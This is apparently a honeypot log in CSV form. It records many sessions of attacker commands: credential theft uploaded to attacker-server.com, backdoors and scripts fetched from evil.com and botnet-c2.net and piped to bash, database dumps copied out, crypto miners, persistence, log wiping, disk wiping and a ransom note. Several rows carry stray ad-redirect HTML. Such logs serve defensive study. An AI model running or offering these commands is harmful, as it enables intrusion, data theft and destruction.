Session_ID,Timestamp,IP_Atacante,Secuencia_Comandos,Total_Comandos
a0d44c08d832,2026-04-20T17:42:44.160925Z,88.13.24.103,cd /tmp -> cd /etc -> ll -> tar  -czvf  config_backup.tar.gz  passwd  shadow  ssh/ ->  -> cd ~ -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz,8
cce168d107c6,2026-04-20T17:43:46.159487Z,88.13.24.103,"mkdir .hidden -> w -> cd .hidden -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown -> exit",10
06943993e4f3,2026-04-20T17:44:41.440330Z,88.13.24.103,env -> set -> echo $PATH -> cd /tmp -> history -> date -> cat ~/.bash_history -> exit,8
e9ae2f7e010e,2026-04-20T17:45:44.340597Z,88.13.24.103,systemctl enable botnet.service -> systemctl  start  botnet -> exit,3
5b0dd4c007da,2026-04-20T17:46:20.861792Z,88.13.24.103,cd .. -> sudo -l -> find / -perm -4000 -type f 2>/dev/null -> cat /etc/sudoers -> exit,5
5680c59f5e0d,2026-04-20T17:52:13.937836Z,88.13.24.103,cd ~ -> find /home -type f -name '*.txt' -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> cd .. -> exit,5
b5acbf6fa31d,2026-04-20T17:54:35.944212Z,88.13.24.103,enable -> system -> echo '' -> shell -> clear -> sh -> cat /proc/mounts -> w -> exit,9
79141987f7c6,2026-04-20T17:55:04.153050Z,88.13.24.103,enable -> system -> echo '' -> shell -> ls -> sh -> cat /proc/mounts -> exot -> exit,9
e4279e5c867b,2026-04-20T17:55:18.931724Z,88.13.24.103,mongo --eval 'db.adminCommand( { listDatabases: 1 } )' -> exit,2
511c1174d06f,2026-04-20T17:55:58.672693Z,88.13.24.103,cd /dev/shm -> tftp -g -r mips.bot 192.168.1.100 -> chmod 777 mips.bot -> ./mips.bot -> rm  mips.bot -> exit,6
c1c248d9bbbc,2026-04-20T17:59:44.687959Z,88.13.24.103,echo c > /proc/sysrq-trigger ->  -> exit,3
2dad2c935000,2026-04-20T18:01:31.931046Z,88.13.24.103,uname -r -> gcc  exploit.c  -o  exploit -> ./exploit -> whoami -> exit,5
512ed9874f65,2026-04-20T18:02:16.959349Z,88.13.24.103,echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab -> history -> crontab  -l -> exot,4
aebb30dd5c8c,2026-04-20T18:03:07.376872Z,88.13.24.103,iptables -F -> iptables -X -> iptables -P INPUT ACCEPT -> iptables -P OUTPUT ACCEPT -> exit,5
6dcd6acf15fa,2026-04-20T18:05:38.812935Z,88.13.24.103,clear -> cd /var/tmp -> curl  -O  http://botnet-c2.net/payload.sh -> bash payload.sh -> rm  payload.sh -> exit,6
b48ff695bb28,2026-04-20T18:06:39.777627Z,88.13.24.103,date -> ls -l /etc/shadow -> chmod 777 /etc/shadow -> exit,4
4ea6e486a59f,2026-04-20T18:07:39.431378Z,88.13.24.103,sudo -l ->  -> find / -perm -4000 -type f 2>/dev/null ->  -> cat /etc/sudoers -> exot,6
5e4af62f2080,2026-04-20T18:07:51.278788Z,88.13.24.103,cd .. -> wget -q -O - http://185.112.x.x/installer.sh | bash -> exit,3
e16b6803a9dc,2026-04-20T18:09:38.793390Z,88.13.24.103,cd /dev/shm -> tftp -g -r mips.bot 192.168.1.100 -> uptime -> chmod 777 mips.bot -> ./mips.bot -> rm mips.bot -> exit,7
9f74035b97b7,2026-04-20T18:11:38.187440Z,88.13.24.103,useradd -m -s /bin/bash sysadmin,1
ff400a3c175c,2026-04-20T18:12:22.860310Z,88.13.24.103,docker run -v /:/mnt --rm -it alpine chroot /mnt sh -> cd ~ -> exit,3
00514c0bdab9,2026-04-20T18:12:30.435405Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> exit,3
2695c6ef7f68,2026-04-20T18:13:15.611203Z,88.13.24.103,uname -a -> whoami ->  -> id -> uptime -> cat  /proc/cpuinfo -> ll -> cat /etc/os-release -> cd .. -> free -m -> df  -h -> ls -la -> exit,13
8cdca52ac2d7,2026-04-20T18:16:51.478344Z,88.13.24.103,dd if=/dev/zero of=/dev/sda bs=1M count=10 -> exit,2
2263bb781a2e,2026-04-20T18:19:12.306648Z,88.13.24.103,ps aux -> kill -9 1234 ->  -> rm  -rf  /var/log/* -> cat /dev/null > ~/.bash_history -> ll -> history -c ->  -> cd .. -> exit,10
6ca2d4697596,2026-04-20T18:24:09.196831Z,88.13.24.103,"mkdir .hidden -> cd .hidden -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown -> exit",9
e73cbcff6608,2026-04-20T18:25:40.129955Z,88.13.24.103,getcap  -r  /  2>/dev/null -> cd .. -> exit,3
e9d93eb6897f,2026-04-20T18:26:23.608173Z,88.13.24.103,systemctl enable botnet.service ->  -> systemctl start botnet -> exit,4
7b68a4676c36,2026-04-20T18:26:40.981485Z,88.13.24.103,uptime -> getcap  -r  /  2>/dev/null -> exit,3
09b778f349d6,2026-04-20T18:28:52.749645Z,88.13.24.103,ls -lah -> useradd -m -s /bin/bash sysadmin,2
2465d863ed71,2026-04-20T18:35:24.375769Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> ll -> exit,4
8f3ddd333d2c,2026-04-20T18:36:41.537131Z,88.13.24.103,iptables -F -> w -> iptables -X -> iptables -P INPUT ACCEPT -> ls -la -> iptables -P OUTPUT ACCEPT -> w -> exit,8
cc17a9ad5868,2026-04-20T18:38:49.220583Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> scp dump.sql hacker@evil.com:/tmp/,2
fd7c76359a4b,2026-04-20T18:39:32.672720Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> scp dump.sql hacker@evil.com:/tmp/,2
172d68606708,2026-04-20T18:39:47.559805Z,88.13.24.103,who -> ls -la /home -> cat /etc/passwd -> cd .. -> cat  /etc/shadow ->  -> cat /etc/group -> who -> exit,9
a7dbfe77da3f,2026-04-20T18:41:53.716623Z,88.13.24.103,useradd -m -s /bin/bash sysadmin,1
16d38523f73d,2026-04-20T18:42:03.881369Z,88.13.24.103,cd /tmp -> echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab -> crontab -l -> exot -> exit,5
c229ee597129,2026-04-20T18:45:47.957841Z,88.13.24.103,"nmap -sT -p 22,80,443,3306 192.168.1.0/24 -> exit",2
3230997fb6ab,2026-04-20T18:46:52.551514Z,88.13.24.103,enable ->  -> ls -la -> system -> shell -> echo '' -> sh -> cat /proc/mounts -> exit,9
85c437473742,2026-04-20T18:47:10.202780Z,88.13.24.103,echo c > /proc/sysrq-trigger -> exit,2
e3deae15c1e9,2026-04-20T18:47:51.617089Z,88.13.24.103,ps aux -> ls -la -> netstat -tulnp -> ifconfig -> ip a -> route -n -> arp -a -> exit,8
89b3cdb600bc,2026-04-20T18:51:34.236587Z,88.13.24.103,find /home -type f -name '*.txt' -> w -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> ls -> exot,5
8650b5ba9782,2026-04-20T18:51:48.781642Z,88.13.24.103,"mkdir .hidden -> ls -> cd .hidden -> cat /etc/issue -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ll -> ./backdoor.elf  & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown",11
292ece100191,2026-04-20T18:52:04.372739Z,88.13.24.103,"nmap  -sT  -p  22,80,443,3306  192.168.1.0/24 -> exit",2
7a6f2bc8c6d2,2026-04-20T18:52:09.261260Z,88.13.24.103,enable -> system -> cd ~ -> shell -> sh -> cat /proc/mounts -> exit,7
7d820a407a58,2026-04-20T18:53:55.106122Z,88.13.24.103,getcap -r / 2>/dev/null -> cd .. -> exit,3
98516263e389,2026-04-20T18:54:10.617533Z,88.13.24.103,cd /tmp -> cd  /tmp -> wget http://malware-domain.com/xmrig.tar.gz -> tar -zxvf xmrig.tar.gz -> chmod +x xmrig -> cd .. -> ./xmrig -o pool.com:3333 -u hacker -> rm  -rf  xmrig* -> exit,9
a9d8bec23e32,2026-04-20T18:54:31.434157Z,88.13.24.103,cd /etc ->  -> tar -czvf config_backup.tar.gz passwd shadow ssh/ -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz -> exit,6
138131b37a74,2026-04-20T18:55:49.462237Z,88.13.24.103,cd  /var/tmp -> curl -O http://botnet-c2.net/payload.sh -> pwd -> bash payload.sh -> rm payload.sh -> exot,6
08c3b8ef0ca2,2026-04-20T18:57:18.159466Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> uptime -> exit,4
76113d1f9f49,2026-04-20T18:57:59.383825Z,88.13.24.103,sudo -l -> pwd -> find / -perm -4000 -type f 2>/dev/null -> cat /etc/sudoers -> exit,5
0237a7dd937d,2026-04-20T18:58:53.475373Z,88.13.24.103,psql -U postgres -c '\l' -> exit,2
f31a0274e303,2026-04-20T18:59:22.943734Z,88.13.24.103,w -> getcap  -r  /  2>/dev/null -> w -> exit,4
d23386e4652c,2026-04-20T19:02:13.065095Z,88.13.24.103,enable -> pwd -> system -> shell -> sh -> w -> cat /proc/mounts -> exit,8
69faef73ba96,2026-04-20T19:03:51.047390Z,88.13.24.103,ll -> cat /etc/rc.local -> echo  '/tmp/miner  &'  >>  /etc/rc.local -> exit,4
f7dc72e5ab51,2026-04-20T19:04:30.443380Z,88.13.24.103,ls -> uname -r -> cd .. -> gcc exploit.c -o exploit -> ./exploit -> whoami -> exot,7
6ffcb392c4a1,2026-04-20T19:05:27.521107Z,88.13.24.103,cat /etc/issue -> cd /var/tmp -> curl -O http://botnet-c2.net/payload.sh -> bash payload.sh -> rm payload.sh -> exit,6
e549245498e4,2026-04-20T19:06:13.365236Z,88.13.24.103,uname -r -> gcc exploit.c -o exploit -> ./exploit -> whoami -> cd ~ -> exit,6
8a04f5a3ee9e,2026-04-20T19:08:10.430311Z,88.13.24.103,cd /var/tmp -> curl  -O  http://botnet-c2.net/payload.sh -> bash payload.sh -> rm  payload.sh -> exit,5
7e2a015d937d,2026-04-20T19:09:17.435287Z,88.13.24.103,"cat /etc/issue -> echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source ~/.bashrc -> exit",4
26d45c88784d,2026-04-20T19:11:09.577974Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> exit,3
503d3c09fb72,2026-04-20T19:12:34.468762Z,88.13.24.103,"mkdir  .hidden -> cd .hidden ->  -> history -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ./backdoor.elf  & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown -> exit",11
64fc9ef66bc5,2026-04-20T19:13:27.663484Z,88.13.24.103,who -> uname -a -> ll -> whoami -> history -> id -> cat /proc/cpuinfo -> cat /etc/os-release -> free -m -> df -h -> ls -la -> exit,12
e96abefd76d8,2026-04-20T19:14:28.482002Z,88.13.24.103,cat /var/www/html/wp-config.php -> echo '' -> grep -i 'password' /var/www/html/wp-config.php -> exit,4
2e56abf38f43,2026-04-20T19:14:39.829000Z,88.13.24.103,uname -a -> cat /etc/issue -> whoami -> id -> ls -> cat  /proc/cpuinfo -> w -> cat /etc/os-release -> free -m -> df  -h -> exit,11
ef29cbe3a150,2026-04-20T19:16:52.131321Z,88.13.24.103,systemctl enable botnet.service ->  -> systemctl start botnet -> cat /etc/issue -> exit,5
addf994bdc14,2026-04-20T19:17:26.862980Z,88.13.24.103,uname -r -> gcc exploit.c -o exploit -> cat /etc/issue -> ./exploit -> whoami -> exit,6
cd2c09514ee3,2026-04-20T19:17:53.276911Z,88.13.24.103,who -> cat  /etc/rc.local -> ls -> echo  '/tmp/miner  &'  >>  /etc/rc.local -> exit,5
04b6106c7004,2026-04-20T19:18:18.520127Z,88.13.24.103,ls -la -> echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> who -> exit,5
1d8d2a1c283c,2026-04-20T19:19:37.467045Z,88.13.24.103,iptables -F -> who -> iptables -X ->  -> iptables -P INPUT ACCEPT -> pwd -> iptables -P OUTPUT ACCEPT -> ls -lah -> exit,9
a657499cfb12,2026-04-20T19:21:02.486814Z,88.13.24.103,ls -la /home -> cat  /etc/passwd -> cat /etc/shadow -> cd - -> cat /etc/group -> date -> exit,7
923fa4162b4b,2026-04-20T19:21:26.552055Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> exit,3
272f5366b22b,2026-04-20T19:21:42.795496Z,88.13.24.103,cd /etc -> tar -czvf config_backup.tar.gz passwd shadow ssh/ -> cd /tmp -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz -> exit,6
f7c2bb10e0cf,2026-04-20T19:22:47.475722Z,88.13.24.103,who -> redis-cli ping -> redis-cli config get dir -> exit,4
e12d4cac0069,2026-04-20T19:23:18.340569Z,88.13.24.103,echo '' -> wget -q -O - http://185.112.x.x/installer.sh | bash -> pwd -> exit,4
406e0c3b7526,2026-04-20T19:23:56.572714Z,88.13.24.103,cd /var/tmp -> curl -O http://botnet-c2.net/payload.sh -> date -> bash payload.sh -> rm payload.sh -> exit,6
d21e6604b0af,2026-04-20T19:25:09.223550Z,88.13.24.103,echo '' -> echo c > /proc/sysrq-trigger,2
e67a94d36deb,2026-04-20T19:25:50.970061Z,88.13.24.103,history -> ps  aux -> kill  -9  1234 -> rm  -rf  /var/log/* -> who -> cat /dev/null > ~/.bash_history -> history -c -> exit,8
4cd28d9b80b8,2026-04-20T19:26:17.412627Z,88.13.24.103,echo '0 * * * * root /tmp/.bot.sh' >> /etc/crontab ->  -> crontab -l ->  -> exit,5
a178854a4863,2026-04-20T19:27:38.696917Z,88.13.24.103,cd /tmp -> wget http://malware-domain.com/xmrig.tar.gz -> tar -zxvf xmrig.tar.gz ->  -> uptime -> chmod +x xmrig -> ./xmrig -o pool.com:3333 -u hacker -> who -> rm -rf xmrig* -> exit,10
1e981f31770e,2026-04-20T19:28:28.615575Z,88.13.24.103,"echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source  ~/.bashrc -> uptime -> exit",4
92828d057025,2026-04-20T19:28:53.580653Z,88.13.24.103,"clear -> nmap -sT -p 22,80,443,3306 192.168.1.0/24 -> exit",3
0bfd9b18ffed,2026-04-20T19:31:20.003812Z,88.13.24.103,"mkdir .hidden -> cd .hidden -> wget  http://evil.com/backdoor.elf -> chmod +x backdoor.elf -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown",8
683cc3395d2a,2026-04-20T19:33:00.712459Z,88.13.24.103,cd /tmp -> cd .. -> wget http://malware-domain.com/xmrig.tar.gz -> tar -zxvf xmrig.tar.gz -> chmod +x xmrig -> ./xmrig -o pool.com:3333 -u hacker -> rm -rf xmrig* -> exit,8
844afd695e58,2026-04-20T19:34:44.928811Z,88.13.24.103,docker run -v /:/mnt --rm -it alpine chroot /mnt sh -> exit,2
bf24c7bc6df2,2026-04-20T19:34:54.208910Z,88.13.24.103,cd ~ -> find /home -type f -name '*.txt' -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> exit,4
1609165e0f4f,2026-04-20T19:35:18.068383Z,88.13.24.103,w -> uname -r -> gcc exploit.c -o exploit -> cd ~ -> ./exploit -> whoami -> who -> exit,8
0466033daf83,2026-04-20T19:37:58.299120Z,88.13.24.103,wget -q -O - http://185.112.x.x/installer.sh | bash -> date -> exit,3
ae6ad42c4c0c,2026-04-20T19:38:13.719035Z,88.13.24.103,pwd -> find /home -type f -name '*.txt' -> echo 'Tus archivos han sido encriptados. Paga 1 BTC a esta direccion.' > /home/LEER_ESTO.txt -> ls -lah -> exit,5
3428ebec7c33,2026-04-20T19:41:01.046559Z,88.13.24.103,cat /etc/issue -> ls -l /etc/shadow -> chmod 777 /etc/shadow -> exit,4
a0a3da15792b,2026-04-20T19:41:58.629760Z,88.13.24.103,enable -> ll -> system -> shell -> sh -> uptime -> cat /proc/mounts ->  -> exit,9
0898a5eea2c9,2026-04-20T19:43:39.330057Z,88.13.24.103,echo 'ssh-rsa AAAAB3NzaC1... hacker@evil' >> ~/.ssh/authorized_keys -> chmod 600 ~/.ssh/authorized_keys -> cat /etc/issue -> exit,4
ecd58aea37f7,2026-04-20T19:46:52.416942Z,88.13.24.103,"mkdir .hidden -> cd .hidden -> wget http://evil.com/backdoor.elf -> chmod +x backdoor.elf ->  -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown -> exit",10
64a64b5595d2,2026-04-20T19:48:26.552994Z,88.13.24.103,cd /tmp -> systemctl enable botnet.service -> systemctl start botnet -> exit,4
e4bd1c58e24d,2026-04-20T19:49:48.374099Z,88.13.24.103,redis-cli ping -> redis-cli config get dir -> exit,3
553f504c353f,2026-04-20T19:51:06.747446Z,88.13.24.103,cat /var/log/auth.log | grep Failed -> cat /var/log/syslog -> history -> exit,4
f0c568998eb3,2026-04-20T19:51:45.488386Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> exot,3
915c39bd1e9e,2026-04-20T19:54:46.828399Z,88.13.24.103,cat /etc/issue -> cat /var/log/auth.log | grep Failed -> cat /var/log/syslog -> ls -lah -> exit,5
8d497e43faae,2026-04-20T19:56:11.154972Z,88.13.24.103,find /var/www/ -name '*.env' -> ls -> cat  /var/www/html/.env -> exit,4
2e6590893740,2026-04-20T19:58:13.636416Z,88.13.24.103,mongo --eval 'db.adminCommand( { listDatabases: 1 } )' -> exot -> exit,3
e1a366b30c47,2026-04-20T19:58:25.992922Z,88.13.24.103,"echo 'alias sudo=""sudo /tmp/keylogger.sh""' >> ~/.bashrc -> source ~/.bashrc -> exit",3
581cfc7637aa,2026-04-20T19:59:43.238521Z,88.13.24.103,cd /tmp -> cd - -> wget http://malware-domain.com/xmrig.tar.gz -> tar  -zxvf  xmrig.tar.gz -> chmod +x xmrig -> date -> ./xmrig -o pool.com:3333 -u hacker -> ls -lah -> rm -rf xmrig*,9
7d50cde8359a,2026-04-20T20:00:43.328996Z,88.13.24.103,mysqldump -u root -p123456 db_name > dump.sql -> scp  dump.sql  hacker@evil.com:/tmp/,2
7560ea01a718,2026-04-20T20:00:58.709717Z,88.13.24.103,history -> find /var/www/ -name '*.env' -> cat  /var/www/html/.env -> ls -lah -> exit,5
b2bff629ca82,2026-04-20T20:01:18.076513Z,88.13.24.103,cat /etc/hostname -> cd - -> cat /etc/hosts -> cat /etc/resolv.conf -> uptime -> exit,6
90f78c736901,2026-04-20T20:04:10.320634Z,88.13.24.103,env -> set -> date -> echo $PATH -> history -> cat ~/.bash_history -> echo '' -> exit,8
e5fa33fe0b61,2026-04-20T20:04:24.672827Z,88.13.24.103,w -> iptables -F -> iptables -X ->  -> iptables -P INPUT ACCEPT -> iptables  -P  OUTPUT  ACCEPT -> w -> exot -> exit,9
